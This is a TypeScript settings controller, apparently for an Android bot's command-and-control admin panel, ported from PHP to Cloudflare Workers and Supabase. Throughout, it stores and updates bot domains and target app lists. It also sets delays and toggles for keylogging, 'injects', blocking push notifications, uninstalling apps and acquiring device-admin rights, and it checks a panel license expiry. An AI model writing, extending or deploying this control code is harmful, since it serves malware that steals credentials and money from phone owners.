// api/src/admin-api/settings.ts
// Controlador de Configurações Globais
// Baseado em admin.class.php (process_settings, getExpireDate, etc.)
// Adaptado para Cloudflare Workers + Supabase

import { SupabaseClient } from '@supabase/supabase-js';
import { loadStaticFileCached } from '../shared/static-loader';
import { package_list_to_array } from '../shared/utils';

// ----------------------------------------------------------------------
// Tipos
// ----------------------------------------------------------------------
export interface SettingsData {
  domains_bot: string[];
  desired_apps: string[];
  block_push_apps: string[];
  minimize_apps: string[];
  uninstall_apps: string[];
  block_push_delay: number;
  minimize_delay: number;
  uninstall_delay: number;
  keylogger_delay: number;
  injects_delay: number;
  net_delay: number;
  get_device_admin_delay: number;
  keylogger_enabled: boolean;
  smarts_ver: string;
}

export interface CommandResult {
  success: boolean;
  message: string;
  data?: any;
}

// ----------------------------------------------------------------------
// Chaves usadas na tabela config
// ----------------------------------------------------------------------
const CONFIG_KEYS = {
  DOMAINS_BOT: 'domains_bot',
  DESIRED_APPS: 'desired_apps',
  BLOCK_PUSH_APPS: 'block_push_apps',
  MINIMIZE_APPS: 'minimize_apps',
  UNINSTALL_APPS: 'uninstall_apps',
  BLOCK_PUSH_DELAY: 'block_push_delay',
  MINIMIZE_DELAY: 'minimize_delay',
  UNINSTALL_DELAY: 'uninstall_delay',
  KEYLOGGER_DELAY: 'keylogger_delay',
  INJECTS_DELAY: 'injects_delay',
  NET_DELAY: 'net_delay',
  GET_DEVICE_ADMIN_DELAY: 'get_device_admin_delay',
  KEYLOGGER_ENABLED: 'keylogger_enabled',
  SMARTS_VER: 'smarts_ver',
  VIEW_MODE: 'view_mode',
  EXPIRE_TS: 'expire_ts',
} as const;

// ----------------------------------------------------------------------
// Função auxiliar: ler um valor da config (ou usar default)
// ----------------------------------------------------------------------
async function getConfigValue(
  supabase: SupabaseClient,
  key: string,
  defaultValue: string = '',
): Promise<string> {
  const { data } = await supabase
    .from('config')
    .select('value')
    .eq('name', key)
    .maybeSingle();

  return data?.value ?? defaultValue;
}

// ----------------------------------------------------------------------
// Função auxiliar: salvar ou atualizar um valor na config
// ----------------------------------------------------------------------
async function setConfigValue(
  supabase: SupabaseClient,
  key: string,
  value: string,
  descr: string = '',
  placeholder: string = '',
): Promise<void> {
  const { data: existing } = await supabase
    .from('config')
    .select('id')
    .eq('name', key)
    .maybeSingle();

  if (existing) {
    await supabase
      .from('config')
      .update({ value })
      .eq('name', key);
  } else {
    await supabase.from('config').insert({
      name: key,
      value,
      descr,
      placeholder,
    });
  }
}

// ----------------------------------------------------------------------
// Função auxiliar: converter string "|" ou "\n" para array
// ----------------------------------------------------------------------
function stringToList(value: string): string[] {
  return package_list_to_array(value);
}

// ----------------------------------------------------------------------
// getSettings – retorna todas as configurações
// ----------------------------------------------------------------------
export async function getSettings(
  supabase: SupabaseClient,
): Promise<SettingsData> {
  try {
    const [
      domainsBot,
      desiredApps,
      blockPushApps,
      minimizeApps,
      uninstallApps,
      blockPushDelay,
      minimizeDelay,
      uninstallDelay,
      keyloggerDelay,
      injectsDelay,
      netDelay,
      getDeviceAdminDelay,
      keyloggerEnabled,
      smartsVer,
    ] = await Promise.all([
      getConfigValue(supabase, CONFIG_KEYS.DOMAINS_BOT),
      getConfigValue(supabase, CONFIG_KEYS.DESIRED_APPS),
      getConfigValue(supabase, CONFIG_KEYS.BLOCK_PUSH_APPS),
      getConfigValue(supabase, CONFIG_KEYS.MINIMIZE_APPS),
      getConfigValue(supabase, CONFIG_KEYS.UNINSTALL_APPS),
      getConfigValue(supabase, CONFIG_KEYS.BLOCK_PUSH_DELAY, '0'),
      getConfigValue(supabase, CONFIG_KEYS.MINIMIZE_DELAY, '0'),
      getConfigValue(supabase, CONFIG_KEYS.UNINSTALL_DELAY, '120'),
      getConfigValue(supabase, CONFIG_KEYS.KEYLOGGER_DELAY, '0'),
      getConfigValue(supabase, CONFIG_KEYS.INJECTS_DELAY, '120'),
      getConfigValue(supabase, CONFIG_KEYS.NET_DELAY, '60'),
      getConfigValue(supabase, CONFIG_KEYS.GET_DEVICE_ADMIN_DELAY, '0'),
      getConfigValue(supabase, CONFIG_KEYS.KEYLOGGER_ENABLED, '0'),
      getConfigValue(supabase, CONFIG_KEYS.SMARTS_VER, '0'),
    ]);

    return {
      domains_bot: stringToList(domainsBot),
      desired_apps: stringToList(desiredApps),
      block_push_apps: stringToList(blockPushApps),
      minimize_apps: stringToList(minimizeApps),
      uninstall_apps: stringToList(uninstallApps),
      block_push_delay: Number(blockPushDelay),
      minimize_delay: Number(minimizeDelay),
      uninstall_delay: Number(uninstallDelay),
      keylogger_delay: Number(keyloggerDelay),
      injects_delay: Number(injectsDelay),
      net_delay: Number(netDelay),
      get_device_admin_delay: Number(getDeviceAdminDelay),
      keylogger_enabled: keyloggerEnabled === '1' || keyloggerEnabled === 'true',
      smarts_ver: smartsVer,
    };
  } catch (err) {
    console.error('getSettings error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// updateSettings – atualiza as configurações
// ----------------------------------------------------------------------
export async function updateSettings(
  supabase: SupabaseClient,
  config: Partial<SettingsData>,
): Promise<CommandResult> {
  try {
    // Valida e prepara os valores
    const updates: Array<[string, string, string, string]> = [];

    if (config.domains_bot !== undefined) {
      const doms = config.domains_bot
        .map((d) => d.trim().replace(/^https?:\/\//, '').replace(/\/$/, ''))
        .filter((d) => d.includes('.'));
      updates.push([CONFIG_KEYS.DOMAINS_BOT, doms.join('|'), 'Domains for bot', '']);
    }

    if (config.desired_apps !== undefined) {
      updates.push([CONFIG_KEYS.DESIRED_APPS, config.desired_apps.join('\n'), '', '']);
    }

    if (config.block_push_apps !== undefined) {
      updates.push([CONFIG_KEYS.BLOCK_PUSH_APPS, config.block_push_apps.join('\n'), '', '']);
    }

    if (config.minimize_apps !== undefined) {
      updates.push([CONFIG_KEYS.MINIMIZE_APPS, config.minimize_apps.join('\n'), '', '']);
    }

    if (config.uninstall_apps !== undefined) {
      updates.push([CONFIG_KEYS.UNINSTALL_APPS, config.uninstall_apps.join('\n'), '', '']);
    }

    if (config.block_push_delay !== undefined) {
      updates.push([CONFIG_KEYS.BLOCK_PUSH_DELAY, String(config.block_push_delay), '', '']);
    }

    if (config.minimize_delay !== undefined) {
      updates.push([CONFIG_KEYS.MINIMIZE_DELAY, String(config.minimize_delay), '', '']);
    }

    if (config.uninstall_delay !== undefined) {
      updates.push([CONFIG_KEYS.UNINSTALL_DELAY, String(config.uninstall_delay), '', '']);
    }

    if (config.keylogger_delay !== undefined) {
      updates.push([CONFIG_KEYS.KEYLOGGER_DELAY, String(config.keylogger_delay), '', '']);
    }

    if (config.injects_delay !== undefined) {
      updates.push([CONFIG_KEYS.INJECTS_DELAY, String(config.injects_delay), '', '']);
    }

    if (config.net_delay !== undefined) {
      updates.push([CONFIG_KEYS.NET_DELAY, String(config.net_delay), '', '']);
    }

    if (config.get_device_admin_delay !== undefined) {
      updates.push([CONFIG_KEYS.GET_DEVICE_ADMIN_DELAY, String(config.get_device_admin_delay), '', '']);
    }

    if (config.keylogger_enabled !== undefined) {
      updates.push([CONFIG_KEYS.KEYLOGGER_ENABLED, config.keylogger_enabled ? '1' : '0', '', '']);
    }

    if (config.smarts_ver !== undefined) {
      updates.push([CONFIG_KEYS.SMARTS_VER, String(config.smarts_ver), '', '']);
    }

    // Aplica todas as atualizações
    for (const [key, value, descr, placeholder] of updates) {
      await setConfigValue(supabase, key, value, descr, placeholder);
    }

    return { success: true, message: 'Settings saved' };
  } catch (err) {
    console.error('updateSettings error:', err);
    return { success: false, message: 'Error saving settings', data: err };
  }
}

// ----------------------------------------------------------------------
// getExpiration – retorna a data de expiração (timestamp em segundos ou null)
// ----------------------------------------------------------------------
export async function getExpiration(
  supabase: SupabaseClient,
): Promise<{ timestamp: number | null; formatted: string; expired: boolean }> {
  try {
    // Tenta ler da config (expire_ts)
    let tsStr = await getConfigValue(supabase, CONFIG_KEYS.EXPIRE_TS, '');

    // Se não estiver na config, tenta carregar do arquivo estático 'expires'
    if (!tsStr) {
      try {
        const fileContent = await loadStaticFileCached('expires');
        if (fileContent) {
          tsStr = fileContent.trim();
        }
      } catch {
        // arquivo não existe
      }
    }

    if (!tsStr) {
      return {
        timestamp: null,
        formatted: 'Not set',
        expired: false,
      };
    }

    const timestamp = Number(tsStr);
    if (isNaN(timestamp)) {
      return {
        timestamp: null,
        formatted: 'Invalid date',
        expired: false,
      };
    }

    const expired = timestamp < Math.floor(Date.now() / 1000);
    const date = new Date(timestamp * 1000);
    const formatted = date.toISOString();

    return { timestamp, formatted, expired };
  } catch (err) {
    console.error('getExpiration error:', err);
    return { timestamp: null, formatted: 'Error', expired: false };
  }
}

// ----------------------------------------------------------------------
// updateExpiration – atualiza a data de expiração
// ----------------------------------------------------------------------
export async function updateExpiration(
  supabase: SupabaseClient,
  timestamp: number,
): Promise<CommandResult> {
  try {
    if (!timestamp || isNaN(timestamp)) {
      return { success: false, message: 'Invalid timestamp' };
    }

    await setConfigValue(
      supabase,
      CONFIG_KEYS.EXPIRE_TS,
      String(timestamp),
      'Expiration timestamp',
      '',
    );

    return { success: true, message: 'Expiration updated' };
  } catch (err) {
    console.error('updateExpiration error:', err);
    return { success: false, message: 'Error updating expiration' };
  }
}

// ----------------------------------------------------------------------
// isPanelExpired – verifica se o painel está expirado
// ----------------------------------------------------------------------
export async function isPanelExpired(
  supabase: SupabaseClient,
): Promise<boolean> {
  const { expired } = await getExpiration(supabase);
  return expired;
}

// ----------------------------------------------------------------------
// getExpirationText – retorna texto legível sobre a expiração
// ----------------------------------------------------------------------
export async function getExpirationText(
  supabase: SupabaseClient,
): Promise<string> {
  try {
    const { timestamp, expired } = await getExpiration(supabase);

    if (!timestamp) {
      return 'Not set';
    }

    if (expired) {
      return 'Expired';
    }

    const now = Math.floor(Date.now() / 1000);
    const diff = timestamp - now;
    const days = Math.round(diff / 86400);

    if (days > 3) {
      return 'License active (long)';
    }

    const word = days === 1 ? 'day' : 'days';
    return `Licence expires in ${days} ${word}`;
  } catch (err) {
    console.error('getExpirationText error:', err);
    return 'Error checking expiration';
  }
}

// ----------------------------------------------------------------------
// getViewMode – retorna o modo de visualização ('day' ou 'night')
// ----------------------------------------------------------------------
export async function getViewMode(
  supabase: SupabaseClient,
): Promise<string> {
  const mode = await getConfigValue(supabase, CONFIG_KEYS.VIEW_MODE, 'day');
  return mode === 'night' ? 'night' : 'day';
}

// ----------------------------------------------------------------------
// setViewMode – atualiza o modo de visualização
// ----------------------------------------------------------------------
export async function setViewMode(
  supabase: SupabaseClient,
  mode: 'day' | 'night',
): Promise<CommandResult> {
  try {
    if (mode !== 'day' && mode !== 'night') {
      return { success: false, message: 'Invalid mode' };
    }

    await setConfigValue(supabase, CONFIG_KEYS.VIEW_MODE, mode);
    return { success: true, message: `View mode set to ${mode}` };
  } catch (err) {
    console.error('setViewMode error:', err);
    return { success: false, message: 'Error setting view mode' };
  }
}

// ----------------------------------------------------------------------
// testServer – opcional, pode ser removido
// ----------------------------------------------------------------------
export async function testServer(): Promise<{ success: boolean; message: string }> {
  return {
    success: true,
    message: 'Server test not implemented in Worker environment',
  };
}